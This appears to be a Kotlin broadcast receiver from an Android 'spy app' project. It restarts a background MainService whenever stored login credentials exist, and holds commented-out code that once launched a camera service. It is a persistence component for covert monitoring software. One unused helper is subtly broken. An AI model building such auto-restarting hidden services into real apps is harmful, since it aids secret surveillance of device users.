package com.komnacki.androidspyapp

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.SystemClock
import android.util.Log
import androidx.core.content.ContextCompat.getSystemService
import androidx.legacy.content.WakefulBroadcastReceiver


class ServiceReceiver : WakefulBroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
//        Log.d("KK: RECEIVER: ", "onReceive")
        //todo: check co to za akcja
        if (intent != null && intent.action != null) {
//            Log.d("KK: RECEIVER: ", "intent and action not null: ")
            val triggerIntent = Intent()
            if (context != null) {
                Log.d("KK: RECEIVER: ", "ACTION: " + intent.action.toString())
                if(!isNextAlarmSet(context)) {
                    val prefs = context.getSharedPreferences(
                        MainActivity.SHARED_PREFERENCE_TAG,
                        Context.MODE_PRIVATE
                    )
                    val prefsUserEmail = prefs.getString(MainActivity.PREFS_USER_EMAIL, null)
                    val prefsUserPassword = prefs.getString(MainActivity.PREFS_USER_PASSWORD, null)
                    if (!prefsUserEmail.isNullOrBlank() && !prefsUserPassword.isNullOrBlank()) {
                        startService(context, triggerIntent)
                    }
                } else {
                    Log.d("KK: RECEIVER: ", "Next alarm is set!")
                }
            }
        }
    }

    private fun startService(context: Context, triggerIntent: Intent) {

        Log.d("KK: ", "TRY TO START CAMERA SERVICE from receiver!")
//        var cameraIntent = Intent(context, CameraService::class.java)
//        context.startService(cameraIntent)

        Log.d("KK: RECEIVER: ", "credentials not null, start service!")
        triggerIntent.setClass(context, MainService::class.java)
        context.startService(triggerIntent)



//        val constraints = Constraints.Builder()
//            .setRequiresCharging(true)
//            .build()
//        val workPolicy = ExistingPeriodicWorkPolicy.KEEP
//        val work = PeriodicWorkRequestBuilder<IntervalWorker>(15, TimeUnit.SECONDS)
//            .setConstraints(constraints)
//            .build()
//        val workManager = WorkManager.getInstance(context)
//        workManager.enqueueUniquePeriodicWork("Kamil", workPolicy, work)
    }

    private fun isMyServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
        val manager = getSystemService(context, serviceClass) as ActivityManager?
        if(manager != null) {
            for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                if (serviceClass.name == service.service.className) {
                    return true
                }
            }
        }
        return false
    }

    private fun isNextAlarmSet(context: Context): Boolean {
        val prefs = context.getSharedPreferences(MainActivity.SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val nextAlarmTime = prefs.getLong(MainActivity.PREFS_SERVICE_NEXT_ALARM, 0)
        Log.d("KK: ", "isNextAlarmSet: prefs:" + nextAlarmTime + ", actual:" + SystemClock.elapsedRealtime() )
        return nextAlarmTime >= System.currentTimeMillis()
    }
}